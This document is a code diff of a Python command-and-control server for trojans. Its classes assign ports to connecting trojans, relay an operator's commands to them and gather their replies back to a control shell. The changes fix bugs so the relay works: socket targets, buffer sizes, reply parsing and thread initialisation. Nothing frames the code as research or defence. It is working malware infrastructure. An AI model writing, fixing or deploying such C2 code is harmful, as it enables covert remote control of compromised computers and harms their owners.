@@ -52,10 +52,10 @@ class TCPServer(threading.Thread):
         :param string: (string) the data that is to be send
         :return: (void)
         """
-        if self.connected is True:
+        if self.connected is True and (string != "" and string != " "):
             # creating a new client socket to send the data passed to the method
             self.sending_socket = socket.socket()
-            self.sending_socket.connect((self.client_ip[0], 8887))
+            self.sending_socket.connect((self.client_ip, 8887))
             # sending the data string via the sending socket
             self.sending_socket.sendall(str.encode(string))
             # closing the client socket after the data has been sent
@@ -138,18 +138,17 @@ class TrojanServer(threading.Thread):
         while self.running:
             self.last_connection = time.time()
             connection, adress = self.socket.accept()
-            request = str(connection.recv(4096))[2:-1]
+            request = str(connection.recv(16384))[2:-1]
             if request == "expecting":
                 while self.send_buffer == "":
                     time.sleep(0.1)
                 connection.sendall(str.encode(self.send_buffer))
                 self.send_buffer = ""
-                self.recv_buffer = (str(connection.recv(16384))[2:-1])
-            elif request[:5] == "reply:":
-                connection.sendall(str.encode("ok"))
-                self.recv_buffer = (str(connection.recv(16384))[2:-1])
             elif request == "ping":
                 connection.sendall(str.encode("ping"))
+            elif request[:6] == "reply:":
+                connection.sendall(str.encode("ok"))
+                self.recv_buffer = request[6:].replace("\\r\\n", "\n")
             connection.close()
 
     def send(self, string):
@@ -197,6 +196,7 @@ class PortManager(threading.Thread):
     :ivar timeout: (int) the default time, that can pass before removing an inactive server
     """
     def __init__(self, port_range, trojans, timeout=1800):
+        super(PortManager, self).__init__()
         self.ports = port_range[1:]
         self.trojans = trojans
         self.timeout = timeout
@@ -249,7 +249,7 @@ class TrojanDistributionServer(threading.Thread):
     :ivar socket: (socket) the socket maintaining the TCP connection
     """
     def __init__(self, port, open_ports, trojans):
-        super(TrojanServer, self).__init__()
+        super(TrojanDistributionServer, self).__init__()
         self.port = port
         self.trojans = trojans
         self.open_ports = open_ports
@@ -267,7 +267,8 @@ class TrojanDistributionServer(threading.Thread):
                 trojanserver = TrojanServer(self.open_ports.acquire(), name)
                 trojanserver.start()
                 self.trojans[name] = trojanserver
-                connection.sendall(str.encode(trojanserver.port))
+                connection.sendall(str.encode(str(trojanserver.port)))
+            connection.close()
 
 
 class TrojanFlowControlServer:
@@ -290,12 +291,12 @@ class TrojanFlowControlServer:
     :ivar user_server: (TCPServer) a default TCP Server app to connect to the control shell
     :ivar connection_server: (TrojanConnectionServer) the server distributing the free ports to the incoming requests
     """
-    def __init__(self, port_range=range(8001, 8100), connection_port=8000, timeout=2000):
+    def __init__(self, port_range=range(8056, 8100), connection_port=8000, timeout=2000):
         # assigning the used port numbers to variables
         self.connection_port = connection_port
         # dictionary containing the TCP connection sockets
         self.trojans = {}
-        self.open_ports = PortManager(port_range, self.trojans, timeout=timeout)
+        self.open_ports = PortManager(list(port_range), self.trojans, timeout=timeout)
         self.open_ports.start()
         # the information for the computer to connect with the actual Control Shell
         self.user_server = TCPServer()
@@ -305,8 +306,8 @@ class TrojanFlowControlServer:
         self.connection_server.start()
 
     def run(self):
-
         while True:
+            time.sleep(0.001)
             if self.user_server.connected:
                 while len(self.user_server.receive_buffer) == 0:
                     time.sleep(0.001)
@@ -316,8 +317,7 @@ class TrojanFlowControlServer:
                     self.user_server.send(self.user_server.end_seq)
                 elif command == "ping":
                     self.user_server.send("ping")
-                    self.user_server.send(self.user_server.end_seq)
-                else:
+                elif command != "" and command != " ":
                     for name in self._list_adressed_trojans(command):
                         if name in self.trojans.keys():
                             trojanserver = self.trojans[name]
